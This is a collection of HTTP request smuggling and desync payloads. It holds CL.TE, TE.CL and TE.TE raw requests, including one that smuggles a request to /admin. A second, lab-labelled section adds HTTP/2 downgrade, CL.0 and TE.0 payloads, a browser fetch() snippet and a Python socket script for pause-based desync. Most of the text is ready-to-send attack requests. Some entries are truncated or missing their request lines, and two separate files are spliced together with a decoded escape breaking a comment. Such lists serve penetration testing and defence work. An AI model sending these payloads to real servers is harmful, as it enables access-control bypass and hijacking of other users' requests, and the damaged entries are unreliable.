# HTTP Request Smuggling Payloads

# CL.TE (Content-Length vs Transfer-Encoding)
# Front-end uses Content-Length, back-end uses Transfer-Encoding

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

---

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 6
Transfer-Encoding: chunked

0

G

---

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


---

# TE.CL (Transfer-Encoding vs Content-Length)
# Front-end uses Transfer-Encoding, back-end uses Content-Length

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

Host: vulnerable-website.com
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=
0


---

# TE.TE (Transfer-Encoding obfuscation)
# Both servers handle Transfer-Encoding but one can be obfuscated

Host: vulnerable-website.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


---

Host: vulnerable-website.com

Transfer-Encoding: chunked
Transfer-Encoding: x

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


---

Transfer-Encoding: chunked

Transfer-Encoding: x

Transfer-encoding: chunked

Host: vulnerable-website.com

Content-Length: 9

test=1

files.content:
# Modern HTTP Desynchronization Payloads
# Isolated proxy/backend lab only. Literal 
 denotes CRLF bytes; decode once.
# HTTP/2 JSON records contain decoded headers and DATA for a protocol-aware client.

# H2.CL: inconsistent content-length and DATA size
{"headers":[[":method","POST"],[":scheme","https"],[":authority","desync.example.test"],[":path","/desync-lab/outer-cl"],["content-length","0"]],"data":"GET /desync-lab/marker-cl HTTP/1.1
Host: desync.example.test

"}

# H2.TE: forbidden HTTP/2 transfer-encoding, expected rejection
{"headers":[[":method","POST"],[":scheme","https"],[":authority","desync.example.test"],[":path","/desync-lab/outer-te"],["transfer-encoding","chunked"]],"data":"0

GET /desync-lab/marker-te HTTP/1.1
Host: desync.example.test

"}

# HTTP/2 CRLF field values; requires a protocol-aware lab client
x-desync-marker: lab
X-Desync-Injected: marker-one
x-desync-marker: lab
Content-Length: 0
x-desync-marker: lab
Transfer-Encoding: chunked

# Authority / Host disagreement
{"headers":[[":method","GET"],[":scheme","https"],[":authority","desync.example.test"],[":path","/desync-lab/authority"],["host","other-desync.example.test"]],"data":""}

# Duplicate pseudo-header negative controls
{"headers":[[":method","GET"],[":scheme","https"],[":authority","desync.example.test"],[":path","/desync-lab/first"],[":path","/desync-lab/second"]],"data":""}
{"headers":[[":method","POST"],[":method","GET"],[":scheme","https"],[":authority","desync.example.test"],[":path","/desync-lab/method"]],"data":""}

# CL.0: four-byte body followed by a controlled request on the same connection
POST /desync-lab/ignore-body HTTP/1.1
Host: desync.example.test
Content-Length: 4
Connection: keep-alive

PINGGET /desync-lab/cl-zero-marker HTTP/1.1
Host: desync.example.test



# TE.0: valid chunk framing followed by a controlled request
POST /desync-lab/ignore-chunks HTTP/1.1
Host: desync.example.test
Transfer-Encoding: chunked
Connection: keep-alive

4
PING
0

GET /desync-lab/te-zero-marker HTTP/1.1
Host: desync.example.test



# Duplicate Content-Length disagreement
POST /desync-lab/conflicting-length HTTP/1.1
Host: desync.example.test
Content-Length: 4
Content-Length: 0

PING
POST /desync-lab/reversed-length HTTP/1.1
Host: desync.example.test
Content-Length: 0
Content-Length: 4

PING

# Content-Length parsing negative controls
POST /desync-lab/invalid-length HTTP/1.1
Host: desync.example.test
Content-Length: invalid

PING
POST /desync-lab/signed-length HTTP/1.1
Host: desync.example.test
Content-Length: +4

PING
POST /desync-lab/comma-length HTTP/1.1
Host: desync.example.test
Content-Length: 4, 0

PING

# CL.TE: six body bytes; zero chunk plus a one-byte request prefix
POST /desync-lab/cl-te HTTP/1.1
Host: desync.example.test
Content-Length: 6
Transfer-Encoding: chunked

0

G

# TE.CL: chunked body versus four-byte Content-Length interpretation
POST /desync-lab/te-cl HTTP/1.1
Host: desync.example.test
Content-Length: 4
Transfer-Encoding: chunked

4
PING
0



# Client-side desync browser control
fetch('https://desync.example.test/desync-lab/browser-control',{method:'POST',mode:'no-cors',credentials:'omit',body:'DESYNC_BROWSER_MARKER'}).then(() => location.assign('https://desync.example.test/desync-lab/browser-followup'));

# Pause-based local socket fixture: one pair, 250 ms pause
import socket, time
with socket.create_connection(('127.0.0.1', 8080), timeout=3) as desync_socket:
    desync_socket.sendall(b'POST /desync-lab/pause HTTP/1.1
Host: localhost
Content-Length: 4
Connection: keep-alive

')
    time.sleep(0.25)
    desync_socket.sendall(b'PINGGET /desync-lab/pause-marker HTTP/1.1
Host: localhost
Connection: close

')
    print(desync_socket.recv(4096))
